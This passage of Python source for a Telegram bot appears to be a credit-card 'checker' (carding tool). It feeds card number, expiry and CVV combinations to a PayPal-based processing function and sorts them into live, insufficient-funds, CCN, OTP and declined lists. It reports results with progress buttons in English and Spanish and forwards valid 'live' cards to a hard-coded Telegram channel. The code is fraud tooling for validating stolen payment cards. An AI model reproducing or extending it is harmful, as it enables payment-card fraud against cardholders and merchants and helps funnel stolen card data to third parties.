					progress = (processed_cards / total_cards) * 100
					card = (f"{cc}|{mes}|{ano}|{cvv}")
					result = process_card_p(card)
					num = result[3]
					lists_mapping = {
						1: working_cards,
						2: insufficient_founds,
						3: ccn_cards,
						4: not_working_cards,
						5: risk_cards
						}
	
					if num in lists_mapping:
						lists_mapping[num].append(card)
#—————–————–———————––———#
					msg_text = result[1]
					if result[2] == True:
						bin_inf = bin_info(result[0])
						edited_message = (f"{card}")
						edited_message = result[4].replace("bin_info",f"═════『 𝐁𝐈𝐍 𝐈𝐍𝐅𝐎 』═════\n{bin_inf}")
						bot.send_message(chat_id,edited_message)
						bot.send_message(-1001785647760,edited_message)
#—————–————–———————––———#
					if language == 'en':
						reply_markup = paypal_markup(card, len(not_working_cards),len(working_cards), len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),len(risk_cards),progress)
					if language == 'es':
						reply_markup = paypal_es_markup(card, len(not_working_cards),len(working_cards), len(insufficient_founds),len(ccn_cards),msg_text,len(card_lines),len(risk_cards),progress)
					try:
						bot.edit_message_text(
chat_id=message.chat.id,
message_id=msg.message_id,
text=msg3,
reply_markup=reply_markup
					)
					except telebot.apihelper.ApiTelegramException:
						time.sleep(2)
				bot.reply_to(message,msg4)
				is_card_checking = False
			except Exception as e:
				print(e)
	else:
			pass
#—————–————–———————––———#
	def paypal_markup(current_card, num_not_working, num_working,  num_insufficient_founds, num_ccn, message_text, All,num_risk,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		live_button = telebot.types.InlineKeyboardButton(text=f"Live: {num_working}", callback_data="live")
		
		insufficient_button = telebot.types.InlineKeyboardButton(text=f"Insufficient Funds: {num_insufficient_founds}", callback_data="no thing")
		
		ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • All: {All} ┇ Declined: {num_not_working} ┇OTP: {num_risk} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progress: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 STOP 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(live_button)
		markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
#—————–————–———————––———#
	def paypal_es_markup(current_card, num_not_working, num_working,  num_insufficient_founds, num_ccn, message_text, All,num_risk,progress):
		
		markup = telebot.types.InlineKeyboardMarkup()
	
		current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
		
		message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
		
		live_button = telebot.types.InlineKeyboardButton(text=f"Vivir: {num_working}", callback_data="live")
		
		insufficient_button = telebot.types.InlineKeyboardButton(text=f"Fondos insuficientes : {num_insufficient_founds}", callback_data="no thing")
		
		ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
			
		all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • Todo: {All} ┇ Rechazado: {num_not_working} ┇OTP: {num_risk} • ⌟", callback_data="no thing")
		
		progress_button = telebot.types.InlineKeyboardButton(text=f"Progreso: {progress:.2f}%", callback_data="progress")
		
		stop_button = telebot.types.InlineKeyboardButton(text="〄 DETENER 〄", callback_data="stop")
	
		markup.row(current_card_button)
		markup.row(message_button)
		markup.row(live_button)
		markup.row(insufficient_button,ccn_button)
		markup.row(all_button)
		markup.row(progress_button)
		markup.row(stop_button)
		return markup
#—————–————–———————––———#
	@bot.callback_query_handler(func=lambda call: True)
	def handle_callback_query(call):
		global is_card_checking
		if call.data == "stop":
			is_card_checking = False
			if language == 'en':
				bot.answer_callback_query(call.id, text="Card checking stopped.")
			if language == 'es':
				bot.answer_callback_query(call.id, text="Se detuvo la verificación de tarjetas.")
#—————–————–———————––———#
bot.polling(non_stop=True)